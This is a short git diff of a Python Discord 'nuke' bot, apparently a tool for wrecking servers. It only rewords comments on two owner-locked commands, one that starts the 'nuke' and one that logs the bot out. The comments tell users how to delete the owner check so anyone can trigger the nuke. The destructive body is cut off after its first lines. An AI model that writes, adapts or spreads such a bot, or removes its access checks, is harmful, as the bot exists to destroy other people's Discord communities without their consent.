@@ -46,13 +46,13 @@ Github: @GotRipped\nCurrent Discord: Ich D-Skid#6969 | Ripped#0001 \n
    await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name= f"clippy.link/sex | Github: @byaki"))
 
 @client.command()
-@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STOPS THE BOTS NUKE!!)
+@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STOPS THE NUKE!!)
 async def stop(ctx): #~ stop command
     await ctx.bot.logout()
     print (Fore.BLUE + f"{client.user.name} has logged out successfully.")
 
 @client.command()
-@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STARTS THE BOTS NUKE!!)
+@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STARTS THE NUKE!!)
 async def sad(ctx): #~ start command / nuke
     await ctx.message.delete()
     guild = ctx.guild
